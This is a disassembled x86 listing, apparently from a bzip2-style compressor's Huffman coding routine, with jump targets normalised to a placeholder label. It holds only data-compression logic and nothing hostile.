mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x4a ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x4c ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x4e ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x50 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x52 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x54 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x56 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x58 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x5a ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x5c ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x5e ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x60 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 + 0x62 ]
mov [ ebp - 0x8c ] cx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x80 ]
add ecx [ eax + edx + 0xc990 ]
mov [ ebp - 0x80 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x88 ]
add ecx [ eax + edx + 0xc994 ]
mov [ ebp - 0x88 ] ecx
movzx edx [ ebp - 0x8c ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x84 ]
add ecx [ eax + edx + 0xc998 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x80 ]
and edx 0xffff
mov [ ebp - 0x4c ] dx
mov eax [ ebp - 0x80 ]
shr eax 0x10
mov [ ebp - 0x4a ] ax
mov ecx [ ebp - 0x88 ]
and ecx 0xffff
mov [ ebp - 0x48 ] cx
mov edx [ ebp - 0x88 ]
shr edx 0x10
mov [ ebp - 0x46 ] dx
mov eax [ ebp - 0x84 ]
and eax 0xffff
mov [ ebp - 0x44 ] ax
mov ecx [ ebp - 0x84 ]
shr ecx 0x10
mov [ ebp - 0x42 ] cx
jmp r-xdata
cmp [ ebp - 0x1c ] 0x10
jge r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
push 0x1
push 0x1
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
jmp r-xdata
mov edx [ ebp - 0x1c ]
add edx 0x1
mov [ ebp - 0x1c ] edx
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov [ ebp + edx - 0xac ] 0x1
mov ecx [ ebp - 0x64 ]
add ecx 0x1
mov [ ebp - 0x64 ] ecx
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x10 ] 0x3b9ac9ff
mov [ ebp - 0x20 ] 0xffffffff
mov [ ebp - 0x64 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x24 ]
mov cx [ eax + edx * 2 ]
mov [ ebp - 0x90 ] cx
mov [ ebp - 0x64 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x268 ] 0x3
jl r-xdata
mov edx [ ebp - 0x1c ]
movzx eax [ ebp + edx - 0xac ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1c ]
add edx 0x1
mov [ ebp - 0x1c ] edx
jmp r-xdata
mov ecx [ ebp - 0x6c ]
add ecx 0x1
mov [ ebp - 0x6c ] ecx
mov ecx [ ebp - 0x64 ]
cmp ecx [ ebp - 0x5c ]
jge r-xdata
mov eax [ ebp - 0x64 ]
cmp eax [ ebp - 0x5c ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x5c ]
push edx
push 0x3
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
mov ecx [ ebp - 0x60 ]
push ecx
push 0xf
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
xor edx edx
jne r-xdata
jmp r-xdata
mov [ ebp - 0x6c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x68 ]
add ecx [ ebp - 0x10 ]
mov [ ebp - 0x68 ] ecx
mov edx [ ebp - 0x20 ]
mov eax [ ebp + edx * 4 - 0x3c ]
add eax 0x1
mov ecx [ ebp - 0x20 ]
mov [ ebp + ecx * 4 - 0x3c ] eax
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x60 ]
mov al [ ebp - 0x20 ]
mov [ edx + 0x680 ] al
mov ecx [ ebp - 0x60 ]
add ecx 0x1
mov [ ebp - 0x60 ] ecx
cmp [ ebp - 0x5c ] 0x6
jne r-xdata
mov edx [ ebp - 0x64 ]
movzx eax [ ebp + edx * 2 - 0x4c ]
cmp eax [ ebp - 0x10 ]
jge r-xdata
jmp r-xdata
mov ecx [ ebp - 0x64 ]
imul ecx ecx 0x102
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx + 0x9324 ]
movzx ecx [ ebp - 0x90 ]
movzx edx [ eax + ecx ]
mov eax [ ebp - 0x64 ]
movzx ecx [ ebp + eax * 2 - 0x4c ]
add ecx edx
mov edx [ ebp - 0x64 ]
mov [ ebp + edx * 2 - 0x4c ] cx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x60 ]
jge r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x1
mov [ ebp - 0x1c ] ecx
cmp [ ebp - 0x6c ] 0x10
jge r-xdata
mov edx [ ebp - 0x54 ]
mov [ ebp - 0x1c ] edx
jmp r-xdata
mov edx [ ebp - 0x50 ]
sub edx [ ebp - 0x54 ]
add edx 0x1
cmp edx 0x32
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x64 ]
movzx edx [ ebp + ecx * 2 - 0x4c ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x64 ]
add edx 0x1
mov [ ebp - 0x64 ] edx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x268 ] 0x3
jl r-xdata
mov [ ebp - 0x6c ] 0x0
jmp r-xdata
mov edx [ ebp - 0x1c ]
shl edx 0x4
add edx [ ebp - 0x6c ]
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + edx + 0x58 ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x50 ]
jg r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx edx [ ecx + eax * 2 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0xb160 ]
mov ecx [ eax + edx * 4 ]
add ecx 0x1
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx edx [ eax + edx * 2 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov esi [ ebp + 0x8 ]
lea eax [ esi + eax + 0xb160 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx eax [ edx + ecx * 2 + 0x2 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx + 0xb160 ]
mov edx [ ecx + eax * 4 ]
add edx 0x1
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx eax [ ecx + eax * 2 + 0x2 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx + 0xb160 ]
mov [ ecx + eax * 4 ] edx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + edx * 2 + 0x4 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov eax [ ebp + 0x8 ]
lea edx [ eax + edx + 0xb160 ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx ecx [ edx + ecx * 2 + 0x4 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov esi [ ebp + 0x8 ]
lea edx [ esi + edx + 0xb160 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx edx [ ecx + eax * 2 + 0x6 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0xb160 ]
mov ecx [ eax + edx * 4 ]
add ecx 0x1
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx edx [ eax + edx * 2 + 0x6 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov esi [ ebp + 0x8 ]
lea eax [ esi + eax + 0xb160 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx eax [ edx + ecx * 2 + 0x8 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx + 0xb160 ]
mov edx [ ecx + eax * 4 ]
add edx 0x1
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx eax [ ecx + eax * 2 + 0x8 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx + 0xb160 ]
mov [ ecx + eax * 4 ] edx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + edx * 2 + 0xa ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov eax [ ebp + 0x8 ]
lea edx [ eax + edx + 0xb160 ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx ecx [ edx + ecx * 2 + 0xa ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov esi [ ebp + 0x8 ]
lea edx [ esi + edx + 0xb160 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx edx [ ecx + eax * 2 + 0xc ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0xb160 ]
mov ecx [ eax + edx * 4 ]
add ecx 0x1
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx edx [ eax + edx * 2 + 0xc ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov esi [ ebp + 0x8 ]
lea eax [ esi + eax + 0xb160 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx eax [ edx + ecx * 2 + 0xe ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx + 0xb160 ]
mov edx [ ecx + eax * 4 ]
add edx 0x1
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx eax [ ecx + eax * 2 + 0xe ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx + 0xb160 ]
mov [ ecx + eax * 4 ] edx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + edx * 2 + 0x10 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov eax [ ebp + 0x8 ]
lea edx [ eax + edx + 0xb160 ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx ecx [ edx + ecx * 2 + 0x10 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov esi [ ebp + 0x8 ]
lea edx [ esi + edx + 0xb160 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx edx [ ecx + eax * 2 + 0x12 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0xb160 ]
mov ecx [ eax + edx * 4 ]
add ecx 0x1
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx edx [ eax + edx * 2 + 0x12 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov esi [ ebp + 0x8 ]
lea eax [ esi + eax + 0xb160 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx eax [ edx + ecx * 2 + 0x14 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx + 0xb160 ]
mov edx [ ecx + eax * 4 ]
add edx 0x1
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx eax [ ecx + eax * 2 + 0x14 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx + 0xb160 ]
mov [ ecx + eax * 4 ] edx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + edx * 2 + 0x16 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov eax [ ebp + 0x8 ]
lea edx [ eax + edx + 0xb160 ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx ecx [ edx + ecx * 2 + 0x16 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov esi [ ebp + 0x8 ]
lea edx [ esi + edx + 0xb160 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx edx [ ecx + eax * 2 + 0x18 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0xb160 ]
mov ecx [ eax + edx * 4 ]
add ecx 0x1
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx edx [ eax + edx * 2 + 0x18 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov esi [ ebp + 0x8 ]
lea eax [ esi + eax + 0xb160 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx eax [ edx + ecx * 2 + 0x1a ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx + 0xb160 ]
mov edx [ ecx + eax * 4 ]
add edx 0x1
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx eax [ ecx + eax * 2 + 0x1a ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx + 0xb160 ]
mov [ ecx + eax * 4 ] edx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + edx * 2 + 0x1c ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov eax [ ebp + 0x8 ]
lea edx [ eax + edx + 0xb160 ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx ecx [ edx + ecx * 2 + 0x1c ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov esi [ ebp + 0x8 ]
lea edx [ esi + edx + 0xb160 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx edx [ ecx + eax * 2 + 0x1e ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0xb160 ]
mov ecx [ eax + edx * 4 ]
add ecx 0x1
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx edx [ eax + edx * 2 + 0x1e ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov esi [ ebp + 0x8 ]
lea eax [ esi + eax + 0xb160 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx eax [ edx + ecx * 2 + 0x20 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx + 0xb160 ]
mov edx [ ecx + eax * 4 ]
add edx 0x1
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx eax [ ecx + eax * 2 + 0x20 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx + 0xb160 ]
mov [ ecx + eax * 4 ] edx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + edx * 2 + 0x22 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov eax [ ebp + 0x8 ]
lea edx [ eax + edx + 0xb160 ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx ecx [ edx + ecx * 2 + 0x22 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov esi [ ebp + 0x8 ]
lea edx [ esi + edx + 0xb160 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx edx [ ecx + eax * 2 + 0x24 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0xb160 ]
mov ecx [ eax + edx * 4 ]
add ecx 0x1
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx edx [ eax + edx * 2 + 0x24 ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov esi [ ebp + 0x8 ]
lea eax [ esi + eax + 0xb160 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx eax [ edx + ecx * 2 + 0x26 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx + 0xb160 ]
mov edx [ ecx + eax * 4 ]
add edx 0x1
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx eax [ ecx + eax * 2 + 0x26 ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx + 0xb160 ]
mov [ ecx + eax * 4 ] edx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + edx * 2 + 0x28 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov eax [ ebp + 0x8 ]
lea edx [ eax + edx + 0xb160 ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx ecx [ edx + ecx * 2 + 0x28 ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
mov esi [ ebp + 0x8 ]
lea edx [ esi + edx + 0xb160 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx edx [ ecx + eax * 2 + 0x2a ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0xb160 ]
mov ecx [ eax + edx * 4 ]
add ecx 0x1
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx edx [ eax + edx * 2 + 0x2a ]
mov eax [ ebp - 0x20 ]
imul eax eax 0x408
mov esi [ ebp + 0x8 ]
lea eax [ esi + eax + 0xb160 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x24 ]
movzx eax [ edx + ecx * 2 + 0x2c ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx + 0xb160 ]
mov edx [ ecx + eax * 4 ]
add edx 0x1
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movzx eax [ ecx + eax * 2 + 0x2c ]
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x408
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx + 0xb160 ]
mov [ ecx + eax * 4 ] edx
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x24 ]
movzx ecx [ eax + edx * 2 + 0x2e ]
mov edx [ ebp - 0x20 ]
imul edx edx 0x408
